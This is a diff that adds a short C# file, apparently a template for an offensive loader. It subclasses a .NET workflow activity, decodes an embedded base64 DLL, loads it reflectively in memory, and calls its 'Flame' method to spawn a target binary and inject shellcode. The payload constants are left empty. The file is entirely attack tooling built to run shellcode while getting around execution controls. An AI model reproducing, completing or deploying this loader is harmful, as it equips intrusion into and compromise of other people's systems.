@@ -1,0 +1,28 @@
+using System;
+using System.Reflection;
+using System.Workflow.Activities;
+using System.Runtime.InteropServices;
+
+public class Program : SequentialWorkflowActivity {
+
+	const string binary = @"";
+	const string shellcode = "";
+	const string dll = "";
+
+	public Program() {
+		TikiSpawn(binary, Convert.FromBase64String(dll), shellcode);
+	}
+
+	private static void TikiSpawn(string binary, byte[] dll, string shellcode) {
+		var asm = Assembly.Load(dll);
+		var type = asm.GetType("TikiSpawn");
+		var instance = Activator.CreateInstance(type);
+
+		type.InvokeMember("Flame",
+			BindingFlags.InvokeMethod | BindingFlags.Static | BindingFlags.Public,
+			null,
+			instance,
+			new object[] { binary, shellcode });
+	}
+
+}
